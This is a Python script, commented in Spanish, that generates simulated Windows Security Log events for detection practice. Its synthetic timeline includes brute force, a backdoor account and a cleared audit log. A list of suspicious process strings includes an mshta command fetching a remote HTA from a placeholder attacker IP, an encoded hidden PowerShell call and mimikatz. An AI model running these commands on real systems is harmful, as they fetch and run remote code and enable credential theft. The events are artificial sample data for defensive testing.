"""
generate_windows_events.py
==========================
Genera un CSV con eventos de Windows Security Log simulados,
equivalente a un EVTX exportado como CSV desde Event Viewer.

Event IDs incluidos:
  4624 — Logon exitoso
  4625 — Logon fallido
  4648 — Logon con credenciales explícitas (runas)
  4672 — Privilegios especiales asignados
  4688 — Nuevo proceso creado
  4720 — Cuenta de usuario creada
  4740 — Cuenta bloqueada (brute force detectado)
  1102 — Log de auditoría borrado (¡MUY sospechoso!)

Nota: para EVTX binario real, descarga EVTX-ATTACK-SAMPLES
de GitHub (sbousseaden) — instrucciones en README.md

Uso:
    python scripts/generate_windows_events.py
    python scripts/generate_windows_events.py --rows 800 --output data/raw/windows_events.csv
"""

import random
import argparse
import pandas as pd
from datetime import datetime, timedelta
from pathlib import Path

random.seed(99)

HOSTNAME      = "DESKTOP-WIN01"
DOMAIN        = "WORKGROUP"
ATTACKER_IP   = "203.0.113.42"
INTERNAL_IPS  = ["192.168.1.10", "192.168.1.11", "192.168.1.20"]
NORMAL_USERS  = ["jsmith", "mgarcia", "lrodriguez", "alopez", "rperez"]
SYSTEM_USERS  = ["SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE"]

NORMAL_PROCESSES = [
    r"C:\Windows\System32\svchost.exe",
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
]

SUSPICIOUS_PROCESSES = [
    r"C:\Users\jsmith\AppData\Local\Temp\payload.exe",
    r"C:\Windows\System32\cmd.exe /c powershell -enc JABjAG...",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -W Hidden",
    r"C:\Users\Public\mimikatz.exe",
    r"C:\Windows\System32\mshta.exe http://203.0.113.42/evil.hta",
]

LOGON_TYPES = {
    "2":  "Interactive",
    "3":  "Network",
    "10": "RemoteInteractive",
}


def fmt_ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%S.000000000Z")


def event_4624(dt, user=None, ip=None, logon_type="3") -> dict:
    user = user or random.choice(NORMAL_USERS)
    ip   = ip   or random.choice(INTERNAL_IPS)
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4624,
        "event_type":     "logon_success",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      ip,
        "port":           random.randint(49152, 65535),
        "logon_type":     logon_type,
        "logon_type_name": LOGON_TYPES.get(logon_type, "Network"),
        "process_name":   None,
        "failure_reason": None,
        "workstation":    HOSTNAME,
    }


def event_4625(dt, user=None, ip=None) -> dict:
    user = user or random.choice(NORMAL_USERS)
    ip   = ip   or ATTACKER_IP
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4625,
        "event_type":     "logon_failure",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      ip,
        "port":           random.randint(49152, 65535),
        "logon_type":     "3",
        "logon_type_name": "Network",
        "process_name":   None,
        "failure_reason": "%%2313",   # Unknown user or bad password
        "workstation":    None,
    }


def event_4648(dt, user) -> dict:
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4648,
        "event_type":     "logon_explicit_credentials",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      ATTACKER_IP,
        "port":           None,
        "logon_type":     "9",
        "logon_type_name": "NewCredentials",
        "process_name":   r"C:\Windows\System32\runas.exe",
        "failure_reason": None,
        "workstation":    HOSTNAME,
    }


def event_4672(dt, user) -> dict:
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4672,
        "event_type":     "special_privileges",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      None,
        "port":           None,
        "logon_type":     None,
        "logon_type_name": None,
        "process_name":   None,
        "failure_reason": None,
        "workstation":    None,
    }


def event_4688(dt, user=None, process=None, suspicious=False) -> dict:
    user    = user    or random.choice(NORMAL_USERS)
    process = process or (
        random.choice(SUSPICIOUS_PROCESSES) if suspicious
        else random.choice(NORMAL_PROCESSES)
    )
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4688,
        "event_type":     "process_created",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      None,
        "port":           None,
        "logon_type":     None,
        "logon_type_name": None,
        "process_name":   process,
        "failure_reason": None,
        "workstation":    None,
    }


def event_4720(dt, new_user="hacker01") -> dict:
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4720,
        "event_type":     "user_account_created",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           new_user,
        "domain":         DOMAIN,
        "source_ip":      None,
        "port":           None,
        "logon_type":     None,
        "logon_type_name": None,
        "process_name":   None,
        "failure_reason": None,
        "workstation":    None,
    }


def event_4740(dt, user) -> dict:
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       4740,
        "event_type":     "account_lockout",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           user,
        "domain":         DOMAIN,
        "source_ip":      ATTACKER_IP,
        "port":           None,
        "logon_type":     None,
        "logon_type_name": None,
        "process_name":   None,
        "failure_reason": "Account locked out",
        "workstation":    None,
    }


def event_1102(dt) -> dict:
    """El evento más sospechoso: alguien borró el log de auditoría."""
    return {
        "timestamp":      fmt_ts(dt),
        "event_id":       1102,
        "event_type":     "audit_log_cleared",
        "computer":       HOSTNAME,
        "channel":        "Security",
        "user":           "jsmith",   # usuario comprometido
        "domain":         DOMAIN,
        "source_ip":      None,
        "port":           None,
        "logon_type":     None,
        "logon_type_name": None,
        "process_name":   r"C:\Windows\System32\wevtutil.exe",
        "failure_reason": None,
        "workstation":    None,
    }


def generate_events(n_rows: int = 800) -> pd.DataFrame:
    records = []
    dt = datetime(2024, 5, 19, 8, 0, 0)

    def tick(s=None):
        nonlocal dt
        dt += timedelta(seconds=s or random.randint(10, 180))

    # Tráfico normal matutino
    normal_count = int(n_rows * 0.50)
    for _ in range(normal_count):
        tick()
        user = random.choice(NORMAL_USERS)
        ip   = random.choice(INTERNAL_IPS)
        records.append(event_4624(dt, user, ip, logon_type="3"))
        if random.random() < 0.4:
            tick(5)
            records.append(event_4688(dt, user))

    # Brute force desde ATTACKER_IP (14:30–14:50)
    dt = datetime(2024, 5, 19, 14, 30, 0)
    target = "jsmith"
    bf_count = int(n_rows * 0.12)
    for _ in range(bf_count):
        tick(random.randint(1, 5))
        records.append(event_4625(dt, target, ATTACKER_IP))

    # Cuenta bloqueada tras brute force
    tick(10)
    records.append(event_4740(dt, target))

    # Acceso exitoso con credenciales robadas (15:02)
    dt = datetime(2024, 5, 19, 15, 2, 0)
    records.append(event_4624(dt, target, ATTACKER_IP, logon_type="3"))
    tick(3)
    records.append(event_4672(dt, target))   # Privilegios especiales
    tick(5)
    records.append(event_4648(dt, target))   # Logon explícito (runas)

    # Actividad nocturna sospechosa (03:22)
    dt = datetime(2024, 5, 20, 3, 22, 0)
    records.append(event_4624(dt, target, ATTACKER_IP, logon_type="10"))  # RDP
    tick(10)
    # Procesos sospechosos
    for proc in SUSPICIOUS_PROCESSES[:3]:
        tick(random.randint(15, 60))
        records.append(event_4688(dt, target, proc, suspicious=True))

    # Creación de usuario backdoor
    tick(120)
    records.append(event_4720(dt, new_user="backdoor_admin"))

    # Borrado del log de auditoría (el más crítico)
    tick(300)
    records.append(event_1102(dt))

    # Relleno con tráfico normal
    dt = datetime(2024, 5, 19, 16, 0, 0)
    while len(records) < n_rows:
        tick()
        user = random.choice(NORMAL_USERS)
        ip   = random.choice(INTERNAL_IPS)
        records.append(event_4624(dt, user, ip))

    df = pd.DataFrame(records)
    df["timestamp"] = pd.to_datetime(df["timestamp"])
    df = df.sort_values("timestamp").reset_index(drop=True)
    return df


def main():
    ap = argparse.ArgumentParser(description="Generador de eventos Windows Security Log")
    ap.add_argument("--rows",   type=int, default=800)
    ap.add_argument("--output", type=str, default="data/raw/windows_events.csv")
    args = ap.parse_args()

    out = Path(args.output)
    out.parent.mkdir(parents=True, exist_ok=True)

    print(f"Generando {args.rows} eventos de Windows Security Log...")
    df = generate_events(args.rows)
    df.to_csv(out, index=False)

    print(f"✓ CSV generado : {out}")
    print(f"  Total filas  : {len(df)}")
    print(f"\nDistribución de Event IDs:")
    print(df["event_id"].value_counts().to_string())
    print(f"\nAnomалías incluidas:")
    print(f"  · Brute force RDP/SMB desde {ATTACKER_IP}")
    print(f"  · Cuenta 'jsmith' bloqueada (4740)")
    print(f"  · Acceso exitoso con credenciales comprometidas")
    print(f"  · Procesos sospechosos (Mimikatz, PowerShell oculto)")
    print(f"  · Usuario backdoor_admin creado (4720)")
    print(f"  · LOG DE AUDITORÍA BORRADO (1102) ← crítico")
    print(f"\nUso siguiente:")
    print(f"  from core.evtx_parser import parse_windows_csv")
    print(f"  df = parse_windows_csv('{out}')")


if __name__ == "__main__":
    main()
